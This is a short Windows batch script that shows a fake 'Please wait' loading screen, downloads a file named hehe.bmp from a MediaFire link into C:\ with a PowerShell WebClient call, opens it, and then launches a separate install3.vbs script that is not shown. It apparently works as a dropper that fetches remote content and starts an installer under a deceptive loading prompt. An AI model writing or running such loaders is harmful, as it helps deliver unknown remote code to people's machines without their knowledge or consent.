@echo off
Title Loading
Color 0A & Mode con cols=65 lines=3
Set "URL=https://download2262.mediafire.com/y4yl8ur75ppg/l4th5clncq3l8up/hehe.bmp"
Set "File=C:\hehe.bmp"
echo(
echo    Please wait...
Call :Download "%url%" "%File%"
If exist "%File%" Start "" "%File%"
start install3.vbs
Exit
::*********************************************************************************
:Download <url> <File>
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('%1','%2')"
exit /b
::*********************************************************************************